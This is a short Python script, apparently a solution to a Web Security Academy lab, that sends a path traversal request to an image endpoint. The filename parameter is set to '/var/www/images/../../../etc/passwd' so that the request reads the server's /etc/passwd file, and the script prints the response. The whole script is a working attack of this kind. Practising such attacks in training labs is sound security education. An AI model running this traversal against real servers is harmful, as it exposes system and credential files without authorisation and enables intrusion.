import requests

site = "0afa007604f20fe68278ec28001200e2.web-security-academy.net"
url = f"https://{site}/image?filename=/var/www/images/../../../etc/passwd"
s = requests.Session()
resp = s.get(url)
print(resp.text)
